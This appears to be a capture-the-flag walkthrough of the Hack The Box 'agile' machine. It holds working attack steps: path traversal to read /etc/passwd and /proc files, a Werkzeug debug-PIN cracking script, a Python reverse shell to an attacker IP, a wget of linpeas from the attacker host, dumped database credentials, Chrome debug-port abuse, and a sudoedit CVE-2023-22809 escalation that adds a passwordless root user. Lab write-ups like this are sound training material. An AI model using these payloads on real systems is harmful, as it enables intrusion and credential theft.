# agile

| Hostname   | Difficulty |
| ---        | ---        |
| agile      | Medium     |

Machine IP: 10.10.11.203 :

```bash
TARGET=10.10.11.203       # agile IP address
```

## Initial Reconnaissance

### Ports and services

Scan for open ports :

```shell
nmap $TARGET -p- --open -Pn
```

```text
Nmap scan report for 10.10.11.203
Host is up (0.020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```shell
nmap agile.htb -p 80 -sC -sV 
```

```text
Nmap scan report for 10.10.11.203
Host is up (0.019s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Identify the web server :

```bash
whatweb $TARGET 
```

```text
http://10.10.11.203 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.203], RedirectLocation[http://superpass.htb], Title[301 Moved Permanently], nginx[1.18.0]
http://superpass.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.203], JQuery, Script, Title[SuperPassword 🦸], nginx[1.18.0]
```

in /etc/hosts, add this hostname :

```text
10.10.11.203   superpass.htb
```

browse to http://superpass.htb :

![](assets/superpass.png)

![](assets/superpass2.png)

Using button "Get Started" leads to a login page :

![](assets/login.png)

No default password could be identifyed. 

We can register a new account :

![](assets/create_vault.png)

- username : `john` 
- password: `doe`

![](assets/vault.png)

Then we can add a password in our vault :

![](assets/create_creds.png)

Then we can export our vault to get a CSV File. we can analyse this with BurpSuite :

![](assets/request.png)

A call to `/vault/export` will forward to `/download?fn=file.csv`.

We can change the file to download :

![](assets/request_download_csv.png)

Using a fake file reveal some informations :

![](assets/error2.png)
![](assets/werkzeug.png)

The application is located in directory `/app/app/superpass/` and this is Werkzeug application.

the file is downloaded from `/tmp` folder. We can get `/etc/passwd` :

![](assets/request_download_exploit.png)

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
corum:x:1000:1000:corum:/home/corum:/bin/bash
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
mysql:x:109:112:MySQL Server,,,:/nonexistent:/bin/false
runner:x:1001:1001::/app/app-testing/:/bin/sh
edwards:x:1002:1002::/home/edwards:/bin/bash
dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
_laurel:x:999:999::/var/log/laurel:/bin/false
```

We can notice some users :

- edwards
- dev_admin
- corum

`runner` account can be interesting also.

When looking at the exception when downloading a non-existing file, the Werkzeug application could allow us to open a debugging console, by clicking on the button on right  of python lines.

The access is locked with a PIN code :

![](assets/lock.png)

This PIN can maybe be broken : https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug#pin-protected-path-traversal

Another article on this PIN code : https://www.bengrewell.com/cracking-flask-werkzeug-console-pin/

This acticle explains how to get crack the PIN code with a script that reproduce the code from werkzeug, and this require some parameters.

1. **username**

On linux, we can read `/proc/self/status` :

http://superpass.htb/download?fn=../proc/self/status

```text
Name:	gunicorn
Umask:	0022
State:	S (sleeping)
Tgid:	1073
Ngid:	0
Pid:	1073
PPid:	1072
TracerPid:	0
Uid:	33	33	33	33
Gid:	33	33	33	33
FDSize:	64
Groups:	33 
NStgid:	1073
NSpid:	1073
NSpgid:	1072
NSsid:	1072
VmPeak:	  291704 kB
VmSize:	  227192 kB
VmLck:	       0 kB
VmPin:	       0 kB
VmHWM:	   62688 kB
VmRSS:	   62688 kB
RssAnon:	   48636 kB
RssFile:	   14052 kB
RssShmem:	       0 kB
VmData:	   65948 kB
VmStk:	     132 kB
VmExe:	    2768 kB
VmLib:	   11840 kB
VmPTE:	     216 kB
VmSwap:	       0 kB
HugetlbPages:	       0 kB
CoreDumping:	0
THP_enabled:	1
Threads:	3
SigQ:	0/15108
SigPnd:	0000000000000000
ShdPnd:	0000000000000000
SigBlk:	0000000000000000
SigIgn:	0000000001001000
SigCgt:	0000000108304226
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	000001ffffffffff
CapAmb:	0000000000000000
NoNewPrivs:	0
Seccomp:	0
Seccomp_filters:	0
Speculation_Store_Bypass:	thread vulnerable
SpeculationIndirectBranch:	conditional enabled
Cpus_allowed:	ffffffff,ffffffff,ffffffff,ffffffff
Cpus_allowed_list:	0-127
Mems_allowed:	00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001
Mems_allowed_list:	0
voluntary_ctxt_switches:	2829
nonvoluntary_ctxt_switches:	153
```

We get the user ID :

- uid=33
- gui=33

To know to which user this ID is for, we can read `/etc/passwd` :

- http://superpass.htb/download?fn=../etc/passwd
- http://superpass.htb/download?fn=../etc/group

user : www-data

2. **MAC address**

We can get this  :

http://superpass.htb/download?fn=../proc/net/arp

```text
IP address       HW type     Flags       HW address            Mask     Device
10.10.10.2       0x1         0x2         00:50:56:b9:ee:c2     *        eth0
```

the network interface is eth0.

http://superpass.htb/download?fn=../sys/class/net/eth0/address

```text
00:50:56:b9:e8:42
```

```
>>> print(0x005056b9e842)
345052407874
```

3. **machine-id**

get it with: 

http://superpass.htb/download?fn=../etc/machine-id

```text
ed5b159560f54721827644bc9b220d00
```

4. **cgroup**

http://superpass.htb/download?fn=../proc/self/cgroup

```text
0::/system.slice/superpass.service
```

`superpass.service`

5. **path to the Flask `app.py`**

From the previous exception, we get it : `/app/venv/lib/python3.10/site-packages/flask/app.py`

6. **module name & application name**

From the article, we can deduce the mudule name (flask.app) and application name (wsgi_app)

**Final PIN script**

```python
import hashlib
import itertools
from itertools import chain

def crack_md5(username, modname, appname, flaskapp_path, node_uuid, machine_id):
    h = hashlib.md5()
    crack(h, username, modname, appname, flaskapp_path, node_uuid, machine_id)

def crack_sha1(username, modname, appname, flaskapp_path, node_uuid, machine_id):
    h = hashlib.sha1()
    crack(h, username, modname, appname, flaskapp_path, node_uuid, machine_id)

def crack(hasher, username, modname, appname, flaskapp_path, node_uuid, machine_id):
    probably_public_bits = [
            username,
            modname,
            appname,
            flaskapp_path ]
    private_bits = [
            node_uuid,
            machine_id ]

    h = hasher
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')

    cookie_name = '__wzd' + h.hexdigest()[:20]

    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

    rv =None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                              for x in range(0, len(num), group_size))
                break
        else:
            rv = num

    print(rv)

if __name__ == '__main__':

    usernames = ['www-data']
    modnames = ['superpass.app','flask.app', 'werkzeug.debug']
    appnames = ['wsgi_app', 'DebuggedApplication', 'Flask']
    flaskpaths = ['/app/venv/lib/python3.10/site-packages/flask/app.py']
    nodeuuids = ['345052407874']
    machineids = ['ed5b159560f54721827644bc9b220d00superpass.service']

    # Generate all possible combinations of values
    combinations = itertools.product(usernames, modnames, appnames, flaskpaths, nodeuuids, machineids)

    # Iterate over the combinations and call the crack() function for each one
    for combo in combinations:
        username, modname, appname, flaskpath, nodeuuid, machineid = combo
        print('==========================================================================')
        crack_sha1(username, modname, appname, flaskpath, nodeuuid, machineid)
        print(f'{combo}')
        print('==========================================================================')

```

When executed, this give th PIN code that is validated by the application:

```text
124-661-574
('www-data', 'flask.app', 'wsgi_app', '/app/venv/lib/python3.10/site-packages/flask/app.py', '345052407874', 'ed5b159560f54721827644bc9b220d00superpass.service')
```

We can now access the console and access the target host :

![](assets/console_exec.png)

```python
__import__('os').popen('whoami').read();
'www-data'
```

We can now open a reverse shell :

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.23",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/usr/bin/bash","-i"]);
```

```shell
nc -nvlp 4444
```

We can upgrade the shell to a full TTY shell:

```python
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```

Let's enumerate that host 

```shell
ls /home
```

```text
corum
dev_admin
edwards
```


```shell
uname -a
```

```text
Linux agile 5.15.0-60-generic #66-Ubuntu SMP Fri Jan 20 14:29:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

We can use linPEAS to enumerate that host.

From our attacker host :

```shell
cp /opt/resources/linux/linPEAS/linpeas_linux_amd64 ./linpeas    

updog
```

on tagrget host :

```shell
cd /tmp
wget -q http://10.10.14.19:9090/linpeas -O /tmp/linpeas
chmod +x /tmp/linpeas
/tmp/linpeas
```

Some interesting results :

```text
root         997  0.0  0.0   4304  2664 ?        Ss   Jul04   0:01 /usr/sbin/cron -f -P
root       53840  0.0  0.1   7760  4160 ?        S    17:35   0:00  _ /usr/sbin/CRON -f -P
runner     53842  0.0  0.0   2888   984 ?        Ss   17:35   0:00      _ /bin/sh -c /app/test_and_update.sh
runner     53843  0.0  0.0   4780  3324 ?        S    17:35   0:00          _ /bin/bash /app/test_and_update.sh
runner     53848  0.0  0.7  37880 31536 ?        S    17:35   0:00              _ /app/venv/bin/python3 /app/venv/bin/pytest -x
runner     53849  0.0  0.3 33625804 13812 ?      Sl   17:35   0:00                  _ chromedriver --port=35401
runner     53855  0.0  2.5 33986460 102540 ?     Sl   17:35   0:00                      _ /usr/bin/google-chrome --allow-pre-commit-input --crash-dumps-dir=/tmp --disable-background-networking --disable-client-side-phishing-detection --disable-default-apps --disable-gpu --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --enable-automation --enable-blink-features=ShadowDOMV0 --enable-logging --headless --log-level=0 --no-first-run --no-service-autorun --password-store=basic --remote-debugging-port=41829 --test-type=webdriver --use-mock-keychain --user-data-dir=/tmp/.com.google.Chrome.3E8wHn --window-size=1420,1080 data:,
runner     53859  0.0  0.0   3348   992 ?        S    17:35   0:00                          _ cat
runner     53860  0.0  0.0   3348  1012 ?        S    17:35   0:00                          _ cat
runner     53867  0.0  1.4 33822084 57908 ?      S    17:35   0:00                          _ /opt/google/chrome/chrome --type=zygote --no-zygote-sandbox --enable-logging --headless --log-level=0 --headless --crashpad-handler-pid=53862 --enable-crash-reporter
runner     53887  0.0  1.9 33916488 78108 ?      Sl   17:35   0:00                          |   _ /opt/google/chrome/chrome --type=gpu-process --enable-logging --headless --log-level=0 --ozone-platform=headless --use-angle=swiftshader-webgl --headless --crashpad-handler-pid=53862 --gpu-preferences=WAAAAAAAAAAgAAAYAAAAAAAAAAAAAAAAAABgAAAAAAA4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAAAIAAAAAAAAAA== --use-gl=angle --use-angle=swiftshader-webgl --enable-logging --log-level=0 --shared-files --field-trial-handle=0,i,3907723225912737164,16292197360565636542,131072 --disable-features=PaintHolding
runner     53868  0.0  1.4 33822072 57636 ?      S    17:35   0:00                          _ /opt/google/chrome/chrome --type=zygote --enable-logging --headless --log-level=0 --headless --crashpad-handler-pid=53862 --enable-crash-reporter
runner     53870  0.0  0.3 33822100 15088 ?      S    17:35   0:00                          |   _ /opt/google/chrome/chrome --type=zygote --enable-logging --headless --log-level=0 --headless --crashpad-handler-pid=53862 --enable-crash-reporter
  └─(Caps) 0x0000000000200000=cap_sys_admin
runner     53918  0.2  3.1 1184727488 126932 ?   Sl   17:35   0:01                          |       _ /opt/google/chrome/chrome --type=renderer --headless --crashpad-handler-pid=53862 --lang=en-US --enable-automation --enable-logging --log-level=0 --remote-debugging-port=41829 --test-type=webdriver --allow-pre-commit-input --ozone-platform=headless --disable-gpu-compositing --enable-blink-features=ShadowDOMV0 --lang=en-US --num-raster-threads=1 --renderer-client-id=5 --time-ticks-at-unix-epoch=-1688502480966495 --launch-time-ticks=76021140047 --shared-files=v8_context_snapshot_data:100 --field-trial-handle=0,i,3907723225912737164,16292197360565636542,131072 --disable-features=PaintHolding
runner     53890  0.0  2.1 33871408 83736 ?      Sl   17:35   0:00                          _ /opt/google/chrome/chrome --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --enable-logging --log-level=0 --use-angle=swiftshader-webgl --use-gl=angle --headless --crashpad-handler-pid=53862 --enable-logging --log-level=0 --shared-files=v8_context_snapshot_data:100 --field-trial-handle=0,i,3907723225912737164,16292197360565636542,131072 --disable-features=PaintHolding --enable-crash-reporter
```

```text
mysql       1025  0.9 13.1 1796040 522688 ?      Ssl  Jul04  11:46 /usr/sbin/mysqld
runner      1075  0.0  0.6  31000 24420 ?        Ss   Jul04   0:12 /app/venv/bin/python3 /app/venv/bin/gunicorn --bind 127.0.0.1:5555 wsgi-dev:app
runner      1078  0.0  1.5  79940 62236 ?        S    Jul04   0:29  _ /app/venv/bin/python3 /app/venv/bin/gunicorn --bind 127.0.0.1:5555 wsgi-dev:app
```

```text
╔══════════╣ Last time logon each user
Username         Port     From             Latest
root             tty1                      Wed Mar  1 18:48:54 +0000 2023
corum            pts/0    10.10.14.21      Wed Jul  5 08:44:31 +0000 2023
edwards          pts/1    10.10.14.21      Wed Jul  5 09:07:39 +0000 2023
```

Let's search for SUID binaries :

```shell
find / -perm -u=s -type f 2>/dev/null
```

```text
/usr/libexec/polkit-agent-helper-1
/usr/bin/umount
/usr/bin/mount
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/su
/usr/bin/newgrp
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/opt/google/chrome/chrome-sandbox
```

When exploring the application sources in /app folder, we can find some information :

```shell
ls -l /app
```

```text
drwxr-xr-x 5 corum     runner    4096 Feb  8 16:29 app
drwxr-xr-x 9 runner    runner    4096 Feb  8 16:36 app-testing
-r--r----- 1 dev_admin www-data    88 Jan 25 00:00 config_prod.json
-r--r----- 1 dev_admin runner      99 Jan 25 15:15 config_test.json
-rwxr-xr-x 1 root      runner     557 Jul  5 20:15 test_and_update.sh
drwxrwxr-x 5 root      dev_admin 4096 Feb  8 16:29 venv
```

```shell
cat /app/config_prod.json
```

```json
{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}
```

in the testing folder, we can get the process :

```shell
cat /app/app-testing/README.md
```

```text
# Testing

New builds in this folder are tested periodically.

If the tests pass, the new build is deployed to the active site.
```


```bash
cat /app/test_and_update.sh
```

```
#!/bin/bash

# update prod with latest from testing constantly assuming tests are passing

echo "Starting test_and_update"
date

# if already running, exit
ps auxww | grep -v "grep" | grep -q "pytest" && exit

echo "Not already running. Starting..."

# start in dev folder
cd /app/app-testing

# system-wide source doesn't seem to happen in cron jobs
source /app/venv/bin/activate

# run tests, exit if failure
pytest -x 2>&1 >/dev/null || exit

# tests good, update prod (flask debug mode will load it instantly)
cp -r superpass /app/app/
echo "Complete!"
```

Now let's upgrade the shell to get full TTYs :

```
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```

now we can use the mysql client :

```shell
mysql -usuperpassuser -p
```

With the password : `dSA6l7q*yIVs$39Ml6ywvgK`

Let's explore the databases and datas :

```text
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| superpass          |
+--------------------+
3 rows in set (0.00 sec)

mysql> use superpass
| users               |
+---------------------+
2 rows in set (0.00 sec)

mysql> select * from users;
+----+----------+--------------------------------------------------------------------------------------------------------------------------+
| id | username | hashed_password                                                                                                          |
+----+----------+--------------------------------------------------------------------------------------------------------------------------+
|  1 | 0xdf     | $6$rounds=200000$FRtvqJFfrU7DSyT7$8eGzz8Yk7vTVKudEiFBCL1T7O4bXl0.yJlzN0jp.q0choSIBfMqvxVIjdjzStZUYg6mSRB2Vep0qELyyr0fqF. |
|  2 | corum    | $6$rounds=200000$yRvGjY1MIzQelmMX$9273p66QtJQb9afrbAzugxVFaBhb9lyhp62cirpxJEOfmIlCy/LILzFxsyWj/mZwubzWylr3iaQ13e4zmfFfB1 |
|  9 | john     | $6$rounds=200000$VoP/vPSQ9vR2Lot5$3taBxfwmbmDi0m/cuutknGhbKh7PRyMy0SE3j2LUY//GeOH3qMY7W1gd/vTi9eHU23x9QUIw15gCjzNtYMrOH0 |
+----+----------+--------------------------------------------------------------------------------------------------------------------------+
3 rows in set (0.00 sec)

mysql> select * from  passwords;
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
| id | created_date        | last_updated_data   | url            | username | password             | user_id |
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
|  3 | 2022-12-02 21:21:32 | 2022-12-02 21:21:32 | hackthebox.com | 0xdf     | 762b430d32eea2f12970 |       1 |
|  4 | 2022-12-02 21:22:55 | 2022-12-02 21:22:55 | mgoblog.com    | 0xdf     | 5b133f7a6a1c180646cb |       1 |
|  6 | 2022-12-02 21:24:44 | 2022-12-02 21:24:44 | mgoblog        | corum    | 47ed1e73c955de230a1d |       2 |
|  7 | 2022-12-02 21:25:15 | 2022-12-02 21:25:15 | ticketmaster   | corum    | 9799588839ed0f98c211 |       2 |
|  8 | 2022-12-02 21:25:27 | 2022-12-02 21:25:27 | agile          | corum    | 5db7caa1d13cc37c9fc2 |       2 |
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
5 rows in set (0.00 sec)
```


## Initial access

### Exploitation

### Maintaining access

```bash
ssh corum@superpass.htb 
```

With the password : `5db7caa1d13cc37c9fc2`

## Post-Exploitation

### Host Reconnaissance

```bash
netstat -tlnp4
```

```text
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:5555          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:53521         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:41829         0.0.0.0:*               LISTEN      -
```

Let's access to these ports from the attacker's host through the SSH tunnel :

```bash
ssh -L 5555:localhost:5555 -L 33060:localhost:33060 -L 5000:localhost:5000 corum@superpass.htb
```

On port 5000 and 5555, there is some other superpass applications


nginX is running as www-data:

```text
root        1021       1  0 19:56 ?        00:00:00   nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
www-data    1022    1021  0 19:56 ?        00:00:00     nginx: worker process
www-data    1023    1021  0 19:56 ?        00:00:00     nginx: worker process
```

nginX is listening on port 80, and forward requests to port 5000 (`sites-available/superpass.nginx`):

```text
server {
    listen 80;
    listen 127.0.0.1:80;
    server_name superpass.htb;
    proxy_read_timeout 300;
    proxy_connect_timeout 300;
    proxy_send_timeout 300;

    location /static {
        alias /app/app/superpass/static;
        expires 365d;
    }

    location /console {
	rewrite ^/console$ /console0xdf last;
    }

    location / {
        #include uwsgi_params;

        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-Protocol $scheme;
    }
}
```

On port 5000, the python application is running under user www-data:

```text
www-data    1071       1  0 19:56 ?        00:00:00   /app/venv/bin/python3 /app/venv/bin/gunicorn --bind 127.0.0.1:5000 --threads=10 --timeout 600 wsgi:app
www-data    1078    1071  0 19:56 ?        00:00:01     /app/venv/bin/python3 /app/venv/bin/gunicorn --bind 127.0.0.1:5000 --threads=10 --timeout 600 wsgi:app
```

The application is started by the systemd service: `/etc/systemd/system/superpass.service`

```text
[Unit]
Description=Superpass password manager
After=network.target

[Service]
User=www-data
Group=www-data
Environment=CONFIG_PATH=/app/config_prod.json
WorkingDirectory=/app/app/
ExecStart=/app/venv/bin/gunicorn --bind 127.0.0.1:5000 --threads=10 --timeout 600 wsgi:app
Restart=always
StandardError=syslog

[Install]
WantedBy=multi-user.target
```

In /app/app/superpass/app.py, we can confirm the debug configuration with werkzeug :

```python
def enable_debug():
    from werkzeug.debug import DebuggedApplication
    app.wsgi_app = DebuggedApplication(app.wsgi_app, True)
    app.debug = True

def main():
    enable_debug()
    configure()
    app.run(debug=True)

def dev():
    configure()
    app.run(port=5555)

if __name__ == '__main__':
    main()

```

A second instance is running on port 5555 :

```text
runner      1070       1  0 19:56 ?        00:00:00   /app/venv/bin/python3 /app/venv/bin/gunicorn --bind 127.0.0.1:5555 wsgi-dev:app
runner      1079    1070  0 19:56 ?        00:00:02     /app/venv/bin/python3 /app/venv/bin/gunicorn --bind 127.0.0.1:5555 wsgi-dev:app
```

We get the file `config_prod.json` which contains mysql (port 3306) credentials


This application is started by a service : `/etc/systemd/system/superpass-test.service`

```text
[Unit]
Description=Superpass password manager test configuration
After=network.target

[Service]
User=runner
Group=runner
Environment=CONFIG_PATH=/app/config_test.json
WorkingDirectory=/app/app-testing/
ExecStart=/app/venv/bin/gunicorn --bind 127.0.0.1:5555 wsgi-dev:app
Restart=always
StandardError=syslog

[Install]
WantedBy=multi-user.target
``` 



As suggested by /app/app-testing/README.md, the application in /app/app-testing should be tested, then copyed to /app/app as a production deployment.

This is performed by the script test_and_update that will execute some automated tests :

```text
root         997       1  0 Jul11 ?        00:00:01   /usr/sbin/cron -f -P
root       26037     997  0 10:14 ?        00:00:00     /usr/sbin/CRON -f -P
runner     26040   26037  0 10:14 ?        00:00:00       /bin/sh -c /app/test_and_update.sh
runner     26042   26040  0 10:14 ?        00:00:00         /bin/bash /app/test_and_update.sh
runner     26048   26042  0 10:14 ?        00:00:00           /app/venv/bin/python3 /app/venv/bin/pytest -x
runner     26049   26048  0 10:14 ?        00:00:00             chromedriver --port=38681
runner     26055   26049  0 10:14 ?        00:00:00               /usr/bin/google-chrome --allow-pre-commit-input --crash-dumps-dir=/tmp --disable-background-networking --disable-client-side-phishing-detection --disable-default-apps --disable-gpu --disab
runner     26059   26055  0 10:14 ?        00:00:00                 cat
runner     26060   26055  0 10:14 ?        00:00:00                 cat
runner     26067   26055  0 10:14 ?        00:00:00                 /opt/google/chrome/chrome --type=zygote --no-zygote-sandbox --enable-logging --headless --log-level=0 --headless --crashpad-handler-pid=26062 --enable-crash-reporter
runner     26086   26067  0 10:14 ?        00:00:00                   /opt/google/chrome/chrome --type=gpu-process --enable-logging --headless --log-level=0 --ozone-platform=headless --use-angle=swiftshader-webgl --headless --crashpad-handler-pid=26062 -
runner     26068   26055  0 10:14 ?        00:00:00                 /opt/google/chrome/chrome --type=zygote --enable-logging --headless --log-level=0 --headless --crashpad-handler-pid=26062 --enable-crash-reporter
runner     26070   26068  0 10:14 ?        00:00:00                   /opt/google/chrome/chrome --type=zygote --enable-logging --headless --log-level=0 --headless --crashpad-handler-pid=26062 --enable-crash-reporter
runner     26116   26070  0 10:14 ?        00:00:01                     /opt/google/chrome/chrome --type=renderer --headless --crashpad-handler-pid=26062 --lang=en-US --enable-automation --enable-logging --log-level=0 --remote-debugging-port=41829 --test
runner     26087   26055  0 10:14 ?        00:00:00                 /opt/google/chrome/chrome --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --enable-logging --log-level=0 --use-angle=swiftshader-w
```

ChromeDriver allow to execute somes actions and test in a browser programmatically. ChromeDriver is using a chrome instance in debug mode via its port 41829.

### Latteral movement

We can use the chrome browser of burpsuite. Access chrome://inspect/, but we also need to port forward that port 41829 to be accessible from our attacker box :

```bash
ssh -L 41829:localhost:41829 corum@superpass.htb
```

Then on Chrome, we can add our target to "network targets" :

![](assets/devices.png)

The target appears :

![](assets/devices2.png)

clic "inspect" to see the target

![](assets/test.png)

The session is already open, so we van clic on "Vault" to see its content :

![](assets/test_creds.png)

We have a few credentials here :

- Agile : edwards:d07867c6267dcb5df0af
- Twitter : dedwards__:7dbfe676b6b564ce5718

We can now open a SSH session with account edwards :

```bash
ssh edwards@superpass.htb
```

`d07867c6267dcb5df0af`

Let's enumerate this user :

```bash
sudo -l
```

```text
Matching Defaults entries for edwards on agile:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
```

We can use sudoedit to perform actions impersonated as dev_admin as :

```bash
sudoedit -u dev_admin /app/config_test.json
```

We can check the version of sudoedit :

```bash
sudoedit --version
```

```text
Sudo version 1.9.9
Sudoers policy plugin version 1.9.9
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.9
Sudoers audit plugin version 1.9.9
```

This version seems vulnerable : CVE-2023-22809 : https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf

### Privilege Escalation

One possible exploit found for CVE-2023-22809 :
https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc/blob/main/exploit.sh

we need to modify a file that dev_admin can control. /app/venv/bin/activate can be written :

```bash
ls -la activate
```

```text
-rw-rw-r-- 1 root dev_admin 1976 Jul 12 11:57 activate
```

Let's excecute the exploit :

```bash
EDITOR='vim -- /app/venv/bin/activate'  sudoedit -u dev_admin /app/config_test.json
```

At the end of the file, write :

```text
echo "fake::0:0:root:/root:/bin/bash" >> /etc/passwd
```

Then wait for the cron job to execute the script.

The line is aded to passwd :

```text
fake::0:0:root:/root:/bin/bash
```

then we can have a root account without password :

```bash
su - fake
root@agile:~# id
uid=0(root) gid=0(root) groups=0(root)
```

